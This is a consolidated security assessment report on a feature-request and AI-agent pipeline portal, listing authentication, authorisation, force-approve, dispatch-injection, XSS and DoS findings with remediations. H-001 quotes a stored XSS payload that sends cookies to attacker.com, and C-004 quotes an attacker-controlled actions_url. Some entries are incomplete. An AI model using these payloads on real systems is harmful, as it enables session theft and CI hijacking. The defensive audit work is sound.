⚠ Process Finding: Pen-Tester / Live-Environment Scope Mismatch

The pen-tester analysed Source/Backend/ (work-items state machine) while the test environment (docker-compose.test.yml) runs portal/Backend/ (feature-requests, bugs, cycles, pipeline-runs). All 13 PEN-IDs reference routes that return HTTP 404 in the live environment. The red-teamer correctly pivoted and found equivalent (and more severe) vulnerabilities in the portal application. Resolution required: either configure the pen-tester to analyse portal/Backend/, or update docker-compose.test.yml to run Source/Backend/. Until resolved, PEN-IDs are marked "Theoretical — Source/Backend only" and RED-IDs cover the live target.

2. Consolidated Findings

Critical (4 findings — all Confirmed Live Exploits)

C-001 Critical Confirmed (Live Exploit) No Authentication on Any Endpoint
Sources: PEN-001 · RED-001 · COMP-001 · SAST-003
Zero authentication middleware exists in both Source/Backend/src/app.ts and portal/Backend/. Every endpoint — data reads, state mutations, approvals, dispatches — is fully accessible to any anonymous HTTP client without a token, session cookie, or API key. The red-teamer confirmed all eight portal route families returned HTTP 200/201 without any Authorization header. This is the root prerequisite for C-002, C-003, C-004, and all seven confirmed breaches.
Remediation 
1. Mount JWT bearer-token middleware globally in app.ts BEFORE all route handlers.
   import { authenticate } from './middleware/auth';
   app.use(authenticate);   // blocks all routes unless valid token present

2. For public health/readiness probes, exclude only /health and /ready.

3. Add login_attempt audit event (success + failure) when auth is implemented.

4. Use jsonwebtoken or passport-jwt; store signing secret in process.env.JWT_SECRET (never in code).
C-002 Critical Confirmed (Live Exploit) No Authorization / RBAC — Any Caller Can Perform Any Action
Sources: PEN-002 · RED-005 · COMP-002
Even after authentication is added, there is no RBAC or ABAC layer. All callers are treated identically regardless of role. The red-teamer confirmed that PATCH and DELETE on any resource succeeds without ownership checks (IDOR) — resource FR-0014 was modified and permanently deleted by an unauthenticated caller in under 2 seconds. Privileged operations (approve, reject, dispatch) require no elevated permission.
Remediation 
1. Define roles: viewer (read-only), operator (workflow actions), admin (approve/reject/dispatch/delete).
2. Implement authorisation middleware extracting role from JWT claims.
3. Decorate route handlers with role guards:
   router.post('/:id/force-approve', requireRole('admin'), handler)
4. Add ownership checks: creator field on every resource; PATCH/DELETE requires creator === req.user.id OR role admin.
5. Emit permission_denied audit event on every 403 response.
C-003 Critical Confirmed (Live Exploit) Assessment / State-Machine Gate Bypass via Force-Approve
Sources: PEN-004 · PEN-005 · RED-002
The POST /api/feature-requests/:id/force-approve endpoint overrides all AI voting results unconditionally. The red-teamer triggered a 4-DENY / 1-approve vote outcome, then called /force-approve with no credentials — the item was set to approved and the four deny votes were silently discarded. In Source/Backend/, the equivalent bypass is the overrideRoute: "fast-track" parameter on POST /api/work-items/:id/route which also skips the assessment pod entirely. Both paths are unauthenticated.
Remediation 
Portal:
1. Guard /force-approve behind requireRole('admin') at minimum.
2. Log a force_approve audit event with actor, resource ID, prior vote tally, and timestamp.
3. Consider removing force-approve entirely and implementing an explicit override request
   workflow with a second approver.

Source/Backend:
4. Move overrideRoute processing behind an admin role check.
5. Emit state_transition audit event when overrideRoute is used, tagging it as a manual override.
C-004 Critical Confirmed (Live Exploit) Unauthenticated Supply-Chain Injection via Team Dispatch
Sources: PEN-003 · RED-003
POST /api/team-dispatches accepts and stores attacker-controlled actions_url, workflow, and repo fields with no authentication, allowlist validation, or ownership check. The red-teamer stored actions_url: "http://attacker.com/red-team-payload" and workflow: "malicious-deploy.yml" — both confirmed HTTP 201. If the orchestrator ever auto-triggers stored actions_url values, this becomes a confirmed SSRF / CI-pipeline hijack. The equivalent in Source/Backend/ is the intake webhook accepting unvalidated type/priority enum values without HMAC signature verification.
Remediation 
1. Require authentication + admin role for POST /api/team-dispatches.
2. Validate actions_url against an allowlist of known GitHub Actions domains:
   const ALLOWED_HOSTS = ['api.github.com', 'github.com'];
   const url = new URL(actions_url);
   if (!ALLOWED_HOSTS.includes(url.hostname)) return res.status(400).json({error: 'Invalid actions_url'});
3. Validate repo against a configured allowlist (process.env.ALLOWED_REPOS).
4. For Source/Backend intake webhooks: validate X-Zendesk-Webhook-Signature HMAC before processing body.
5. Add enum validation for type and priority on intake endpoints (match POST /api/work-items behavior).

High (3 findings)

H-001 High Confirmed (Live Exploit) Stored XSS via Unescaped User-Controlled Fields
Sources: RED-006
The red-teamer stored <script>alert(document.cookie)</script> in a feature request title and <img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)> in the description. Both payloads were confirmed stored verbatim (HTTP 201) and returned verbatim in GET responses. If rendered in a frontend template without proper HTML escaping, this executes in any user's browser and exfiltrates session cookies.
Remediation 
Server-side (preferred primary defence):
1. Sanitize string inputs on ingest using sanitize-html or DOMPurify (server-side version):
   import sanitizeHtml from 'sanitize-html';
   title = sanitizeHtml(title, { allowedTags: [], allowedAttributes: {} });  // strip all tags

Frontend (secondary defence):
2. Always render user-controlled strings via React's JSX (which auto-escapes), never via dangerouslySetInnerHTML.
3. Add Content-Security-Policy header (see H-003/COMP-005) to block inline script execution as a backstop.
H-002 High Theoretical Missing Required Audit Log Events (SOC2 CC7.1 Gap)
Sources: COMP-003
Three of four required audit events are entirely absent: login_attempt, permission_denied, and data_export cannot be emitted because no auth/authz system exists. state_transition is partially covered via WorkItem changeHistory[] but is not emitted as a dedicated structured log event with a filterable event field. SOC2 CC7.1 requires detection of security-relevant events; the current gap prevents any automated security monitoring.
Remediation 
1. Create an auditLog() wrapper in utils/logger.ts:
   export function auditLog(event: string, actor: string, resourceId: string, outcome: string) {
     logger.info({ event, actor, resourceId, outcome, timestamp: new Date().toISOString() });
   }

2. Emit state_transition on every buildChangeEntry call for the status field.
3. Once auth is implemented: emit login_attempt on every auth attempt (success + failure).
4. Emit permission_denied on every 403 response.
5. Define and emit data_export if any export/reporting endpoints are added.
H-003 High Theoretical No TLS / HTTPS Enforcement — All Traffic in Plaintext
Sources: COMP-004
The backend listens on plain HTTP. There is no TLS certificate configuration, no HTTPS redirect middleware, and no HSTS header. Once authentication is added, credentials (tokens, session cookies) will travel over the wire in plaintext and are trivially interceptable on any non-loopback network. The Vite dev-server proxy also uses HTTP.
Remediation 
1. Terminate TLS at the infrastructure layer (nginx/Caddy reverse proxy). Example nginx snippet:
   server {
     listen 443 ssl;
     ssl_certificate /etc/ssl/certs/app.crt;
     ssl_certificate_key /etc/ssl/private/app.key;
     location / { proxy_pass http://localhost:3001; }
   }
2. Add Helmet HSTS header in app.ts:
   app.use(helmet({ hsts: { maxAge: 31536000, includeSubDomains: true } }));
3. Ensure Vite proxy targets HTTPS when deployed outside localhost.

M-001 Medium Confirmed (Live Exploit) Unbounded Pagination — Full Dataset Enumeration

const limit = Math.min(parseInt(req.query.limit as string) || 20, MAX_LIMIT);
const offset = (parseInt(req.query.page as string) || 1) - 1) * limit;
// Pass limit + offset to service layer / SQL query.
M-002 Medium Confirmed (Live Exploit) Pipeline Runs Expose Internal Agent Identities and Architecture
Sources: RED-008
GET /api/pipeline-runs returns full CI/CD pipeline structure including stage names, agent IDs, verdicts, and timing with no authentication. Confirmed agent identities exposed: requirements-reviewer, api-contract, backend-coder, frontend-coder, chaos-tester, security-qa, traceability-reporter, visual-playwright, qa-review-and-tests, design-critic, integration-reviewer. This organisational intelligence enables targeted social engineering and reveals QA/security coverage gaps.
Remediation 
1. Gate GET /api/pipeline-runs behind authentication (operator role minimum).
2. Consider scrubbing agent-identity fields (agentId, stageName) from the response for non-admin callers.
3. Apply the same guard to GET /api/learnings which exposes internal retrospective data.
M-003 Medium Theoretical Cascade Auto-Dispatch on Blocker Rejection — Business Logic Flaw
Sources: PEN-007
DISPATCH_TRIGGER_STATUSES = [Completed, Rejected] — rejecting a blocker work item automatically dispatches its approved dependents to implementation teams, even though a rejection may indicate the entire dependency chain is invalid. An attacker can exploit this to trigger unwanted dispatches by rejecting any blocker item (no auth required, per C-001).
Remediation 
1. Remove Rejected from DISPATCH_TRIGGER_STATUSES; only Completed should trigger cascade dispatch.
2. When a blocker is rejected, transition dependents to a "needs-review" status rather than dispatching them.
3. Add a human confirmation step before cascading any auto-dispatch triggered by rejection.
M-004 Medium Theoretical Soft-Deleted Blocker Permanently Blocks Dependent Items
Sources: PEN-008
When a blocker is soft-deleted, computeHasUnresolvedBlockers treats findById() === undefined as an unresolved blocker, permanently blocking all dependents with no automated recovery path. The dependency link is not cleaned up on soft-delete.
Remediation 
Option A (recommended): On soft-delete, call removeDependency for every item that lists
the deleted item as a blocker. Remove the link before marking deleted.

Option B: In computeHasUnresolvedBlockers, treat a missing blocker as resolved:
  const blocker = store.findById(link.blockerItemId);
  if (!blocker || blocker.deleted) continue;  // treat deleted as resolved
  if (!RESOLVED_STATUSES.includes(blocker.status)) return true;
M-005 Medium Theoretical O(N²) DoS via Chained Dependency Flooding
Sources: PEN-009
Every addDependency call runs a full BFS cycle-detection traversal. Creating a linear chain of N items requires O(N²) total BFS work. With no rate limiting and no auth (C-001), an attacker can create thousands of chained items to degrade server CPU. Node.js is single-threaded; a heavy BFS blocks the event loop for all concurrent requests.
Remediation 
1. Enforce a max dependency-chain depth (e.g., MAX_DEPTH = 50). Reject addDependency calls
   that would exceed the limit.
2. Add express-rate-limit to POST /api/work-items and POST /:id/dependencies (e.g., 30 req/min/IP).
3. Consider memoising the cycle-detection BFS result per item and invalidating on mutation.

M-007 Medium Theoretical No Rate Limiting on Any Endpoint
Sources: COMP-006
No rate-limiting middleware exists. Any client can flood intake webhooks, work-item creation, or assessment endpoints at unbounded rates, exhausting memory or CPU. Combined with C-001 (no auth), brute-force and resource exhaustion attacks require zero effort.
Remediation 
npm install express-rate-limit
import rateLimit from 'express-rate-limit';
// Global default: 100 req/min per IP
app.use(rateLimit({ windowMs: 60_000, max: 100 }));
// Tighter limit on mutation endpoints:
const mutationLimit = rateLimit({ windowMs: 60_000, max: 20 });
app.use('/api/intake', mutationLimit);
app.use('/api/team-dispatches', mutationLimit);
M-008 Medium Theoretical No Hard-Delete / Right-to-Erasure Mechanism (GDPR Art. 17 Risk)
Sources: COMP-009
Only soft-delete is implemented; data persists indefinitely. title and description fields can contain PII. No mechanism exists to permanently erase individual records on a right-to-erasure request. Medium now; escalates to High if user-identity fields are added.

M-010 Medium Theoretical /api/search Endpoint Missing from Backend
Sources: PEN-010
The frontend DependencyPicker calls GET /api/search?q=<query> which does not exist in Source/Backend/. The feature is non-functional. Future risk: if implemented naively with new RegExp(q), the unsanitised q parameter creates a ReDoS vector.
